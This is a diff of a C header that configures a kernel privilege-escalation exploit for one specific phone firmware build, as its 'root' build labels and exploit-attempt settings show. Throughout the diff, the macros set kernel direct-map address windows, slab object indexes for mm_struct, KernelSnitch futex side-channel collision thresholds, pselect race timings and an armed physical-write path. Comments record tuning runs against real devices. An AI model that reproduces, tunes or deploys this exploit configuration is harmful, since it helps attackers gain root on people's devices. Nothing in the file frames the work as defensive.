@@ -2,51 +2,8 @@
 #define OFFSET_H
 
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
-#define BUILD_VARIANT_LABEL \
-  "e2q-S9260ZCU5DZDP-app-root-mms3c0-legacygate-bank1000-object33-window8-split4-cooldown-threshold10"
+#define BUILD_VARIANT_LABEL "e2q-S9260ZCU5DZDP-app-physical-p0-oracle"
 #define APP_PHYS_P0_ORACLE 1
-#define APP_REQUIRE_FRESH_P0_SESSION 1
-#define APP_P0_REFRESH_ORACLE_EACH_FRESH_PAGE 1
-#define APP_P0_GATE_RETRY_ATTEMPTS 1
-#define APP_PIPE_PAGE_PREPARE_ATTEMPTS 8
-/* Split the previously successful 32-pass P0 search into four fresh
- * supervisor children.  The 32-pass single child reached a P0 page at
- * 22:20:58, then rebooted while starting kernel-page preparation; a fresh
- * child keeps each allocator burst below that pressure point. */
-#define APP_KERNEL_PAGE_KSNITCH_IDENTITY_END 0xffffff8b00000000ULL
-#define APP_KERNEL_PAGE_KSNITCH_IDENTITY_START 0xffffff8800000000ULL
-#define APP_KERNEL_PAGE_KSNITCH_EXACT_PARTITION 1
-#define APP_SLIDE_MIN_OBJECT_INDEX 0
-#define APP_SLIDE_MAX_OBJECT_INDEX 33
-#define APP_P0_MIN_OBJECT_INDEX 0
-#define APP_P0_MAX_OBJECT_INDEX 33
-/* The current clean-boot traces place usable mm_structs at object indexes
- * 12, 19, and 21. MM_STRUCT_SZ=0x3c0 yields 34 objects in an order-3 slab;
- * the former 0..31 cap silently excluded the final two legal positions. */
-#define APP_FOPS_MIN_OBJECT_INDEX 0
-/* Root-first profile: one physical gate attempt per fresh P0 session, with
- * conservative collision confirmation and no cross-process reuse after a
- * physical trigger.  The prepare-only profile is retained separately for
- * diagnostics in target-prepare-only.h. */
-#define APP_ROOT_SINGLE_ATTEMPT 1
-#define APP_FAIL_CLOSED_P0 1
-#define APP_ALLOW_FRESH_P0_RETRIES 1
-#define APP_P0_PREPARE_ONLY 1
-#define APP_P0_PREPARE_P0_ONLY 1
-#define APP_P0_PREPARE_DIAGNOSTIC 1
-#define APP_P0_PHYSICAL_WRITE_ARMED 1
-#define APP_P0_DIAGNOSTIC_THEN_ROOT 1
-/* Keep the P0 collision oracle at the KernelSnitch default.  The e2q
- * threshold-6 experiment produced repeatable collision triples but no
- * mm_struct candidate; threshold 6 remains specific to the later kernel-page
- * source-pointer search. */
-#define KERNELSNITCH_KERNEL_PAGE_THRESHOLD_MULT 6
-#define KERNELSNITCH_KERNEL_PAGE_COLLISIONS 2
-#define DEFAULT_ATTEMPT_TIMEOUT_SEC 900
-#define DEFAULT_P0_ATTEMPT_TIMEOUT_SEC 900
-#define DEFAULT_EXPLOIT_ATTEMPTS 4
-#define APP_MIN_EXPLOIT_ATTEMPTS 4
-#define APP_P0_TO_KERNEL_COOLDOWN_USEC 5000000
 #else
 #define BUILD_VARIANT_LABEL "e2q-S9260ZCU5DZDP-root-umh"
 #endif
@@ -61,13 +18,6 @@
 #define P0_PHYS_OFFSET 0x80000000ULL
 #define P0_KERNEL_PHYS_LOAD 0x80080000ULL
 #define SKB_DATA_DELTA (-0x1000LL)
-#define MM_STRUCT_SZ 0x3c0
-#define MM_ORDER 3
-#define KERNELSNITCH_MTE_ENABLED 1
-#define KERNELSNITCH_VERBOSE 1
-#define KERNELSNITCH_FUTEX_HASH_SIZE 0x1000
-#define KSNITCH_COLLISIONS 4
-#define KERNELSNITCH_COLLISION_CONFIRMATIONS 3
 
 #define SLIDE_FAKE_WAITER_PRIO 0
 #define SLIDE_WAITER_WAKE_STATE 0
@@ -88,53 +38,14 @@
   0x1c0000ULL, 0x1d0000ULL, 0x1e0000ULL, 0x1f0000ULL
 #define SLIDE_MAX_ATTEMPTS 32
 
-#define APP_SLIDE_RECLAIM_SENDS 16
-#define APP_SLIDE_RECLAIM_SNDBUF 1048576
-#define APP_MM_LATE_DRAIN_TRIGGERS 2
-#define APP_DEFER_FINAL_DRAIN_REAP 1
-#define APP_DEFER_ALL_DRAIN_REAPS 1
-#define APP_QUIET_RECLAIM_WINDOW 1
-/* Keep the reclaim-side direct-map guard at the full canonical direct-map
- * limit.  P0 and kernel-page scans use the narrower validated 0x8f8 window
- * below, while the final physical read/write path still validates each page. */
-#define APP_RECLAIM_MAX_DIRECT_BASE 0xffffff9000000000ULL
-/* Clean-boot runs have produced valid reclaimed skb pages throughout the
- * ffffff80... through ffffff8b... partitions, including the recorded
- * ffffff8b1f... candidate.  Stop before the documented ffffff8ffd... fault
- * region, but do not discard the intervening partitions before validation. */
-#define APP_P0_PIPE_MIN_BASE 0xffffff8000000000ULL
-#define APP_P0_PIPE_MAX_BASE 0xffffff8b00000000ULL
-#define APP_FOPS_PSELECT_DELAY_USEC 50000
-
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
-#define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 8
-#define APP_SLIDE_FRESH_PAGE_ATTEMPTS 8
-#define APP_FOPS_FRESH_PAGE_ATTEMPTS 8
-#define APP_SLIDE_KERNEL_PAGE_SEARCH_BATCHES 32
-#define APP_FOPS_KERNEL_PAGE_SEARCH_BATCHES 32
-#define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 8
 #define ROUTE_WAIT_SECONDS 8
-#define SLIDE_PSELECT_TIMEOUT_NSEC 500000000L
-#define SLIDE_PSELECT_WAKE_USEC 1000
-#define APP_ACCEPT_SCHED_TRIGGER 0
-/* The p0treepi experiment produced pselect readiness and a successful child
- * route but still recorded gate_hits=0.  Return to the legacy gate geometry
- * for this root-first pass; the physical route remains proof-gated. */
-#define APP_P0_GATE_PI_RIGHT 0
-#define APP_P0_GATE_TREE_LEFT 0
-#define SLIDE_SYNC_PSELECT_SYSCALL 1
-#define SLIDE_GUARD_PSELECT_SYSCALL 1
-#define SLIDE_PSELECT_READY_TIMEOUT_USEC 20000
-#define SLIDE_PSELECT_RECHECK_TIMEOUT_USEC 20000
-#define SLIDE_PSELECT_WCHAN_CONFIRMATIONS 3
-#define APP_PSELECT_TRIGGER_MAX_AGE_USEC 150000
-#define APP_PSELECT_POST_GUARD_AGE_CHECK 1
-#define SLIDE_PHYSICAL_SLOT_DELAYS_USEC \
-  0, 15000, 25000, 40000
+#define PSELECT_ENTER_DELAY_USEC 50000
+#define SLIDE_PSELECT_TIMEOUT_NSEC 100000000L
 #define SLIDE_KSNITCH_APPENDED_FUTEXES 2048
 #define SLIDE_KSNITCH_REPEAT_MEASUREMENT 64
 #define SLIDE_KSNITCH_AVERAGE 8
-#define SLIDE_BANK_SLOTS 5
+#define SLIDE_BANK_SLOTS 4
 #define SLIDE_BANK_TASK_OFF 0x1000
 #define SLIDE_BANK_TASK_STRIDE 0x1c0
 #define SLIDE_BANK_LOCK_OFF 0x5200
@@ -144,7 +55,6 @@
 #define P0_ORACLE_PROBE_SLOT 1
 #define P0_ORACLE_GATE_RESTORE_SLOT 2
 #define P0_ORACLE_PROBE_RESTORE_SLOT 3
-#define P0_ORACLE_PRODUCTION_SLOT 4
 #define P0_ORACLE_GATE_PAGE_OFF 0x0e80
 #define P0_ORACLE_GATE_OBJECT_INDEX 1
 #define P0_ORACLE_PROBE_OFFSET 0x1f0000ULL
@@ -217,7 +127,6 @@
   (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
 #define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE \
   (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
-/* Compatibility with the shared payload's current descriptive macro names. */
 #define SLIDE_NFULNL_LOGGER_NAME_IMAGE SLIDE_NFULNL_LOGGER_IMAGE
 #define SLIDE_NFULNL_LOGGER_OBJECT_IMAGE SLIDE_LOGGERS_0_1_IMAGE
 #define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE \
